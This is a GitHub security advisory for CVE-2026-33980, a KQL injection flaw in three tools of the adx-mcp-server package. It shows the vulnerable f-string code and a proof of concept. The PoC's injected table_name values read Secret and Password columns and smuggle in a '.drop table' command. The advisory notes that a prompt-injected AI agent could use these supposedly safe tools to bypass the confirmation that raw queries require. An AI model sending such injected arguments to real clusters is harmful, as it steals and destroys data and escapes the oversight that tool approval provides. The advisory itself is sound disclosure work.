# [H] Azure Data Explorer MCP Server: KQL Injection in multiple tools allows MCP client to execute arbitrary Kusto queries

## Summary
Severity: High
Advisory: GHSA-vphc-468g-8rfp
CVE: CVE-2026-33980
CWE: CWE-943
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2026-03-27
Source: https://github.com/advisories/GHSA-vphc-468g-8rfp
Type: github-advisory

## Affected
- PyPI: `adx-mcp-server` — affected >=0

## Details
### Summary

adx-mcp-server (<= latest, commit 48b2933) contains KQL (Kusto Query Language) injection vulnerabilities in three MCP tool handlers: `get_table_schema`, `sample_table_data`, and `get_table_details`. The `table_name` parameter is interpolated directly into KQL queries via f-strings without any validation or sanitization, allowing an attacker (or a prompt-injected AI agent) to execute arbitrary KQL queries against the Azure Data Explorer cluster.

### Details

The MCP tools construct KQL queries by directly embedding the `table_name` parameter into query strings:

**Vulnerable code** ([permalink](https://github.com/pab1it0/adx-mcp-server/blob/48b2933/src/adx_mcp_server/server.py#L228)):

```python
@mcp.tool(...)
async def get_table_schema(table_name: str) -> List[Dict[str, Any]]:
    client = get_kusto_client()
    query = f"{table_name} | getschema"          # <-- KQL injection
    result_set = client.execute(config.database, query)
```

```python
@mcp.tool(...)
async def sample_table_data(table_name: str, sample_size: int = 10) -> List[Dict[str, Any]]:
    client = get_kusto_client()
    query = f"{table_name} | sample {sample_size}"  # <-- KQL injection
    result_set = client.execute(config.database, query)
```

```python
@mcp.tool(...)
async def get_table_details(table_name: str) -> List[Dict[str, Any]]:
    client = get_kusto_client()
    query = f".show table {table_name} details"     # <-- KQL injection
    result_set = client.execute(config.database, query)
```

KQL allows chaining query operators with `|` and executing management commands prefixed with `.`. An attacker can inject:
- `sensitive_table | project Secret, Password | take 100 //` to read arbitrary tables
- Newline-separated management commands like `.drop table important_data` via `get_table_details`
- Arbitrary KQL analytics queries via any of the three tools

**Note:** While the server also has an `execute_query` tool that accepts raw KQL by design, the three vulnerable tools are presented as safe metadata-inspection tools. MCP clients may grant automatic access to "safe" tools while requiring confirmation for `execute_query`. The injection bypasses this trust boundary.

### PoC

```python
# PoC: KQL Injection via get_table_schema tool
# The table_name parameter is injected into: f"{table_name} | getschema"

import json

# MCP tool call that exfiltrates data from a sensitive table
tool_call = {
    "name": "get_table_schema",
    "arguments": {
        "table_name": "sensitive_data | project Secret, Password | take 100 //"
    }
}
print(json.dumps(tool_call, indent=2))

# Resulting KQL: "sensitive_data | project Secret, Password | take 100 // | getschema"
# The // comments out "| getschema", executing an arbitrary data query instead

# Destructive example via get_table_details:
tool_call_destructive = {
    "name": "get_table_details",
    "arguments": {
        "table_name": "users details\n.drop table critical_data"
    }
}
# Resulting KQL:
#   .show table users details
#   .drop table critical_data details
```

## References
- https://github.com/pab1it0/adx-mcp-server/security/advisories/GHSA-vphc-468g-8rfp
- https://nvd.nist.gov/vuln/detail/CVE-2026-33980
- https://github.com/pab1it0/adx-mcp-server/commit/0abe0ee55279e111281076393e5e966335fffd30
- https://github.com/pab1it0/adx-mcp-server
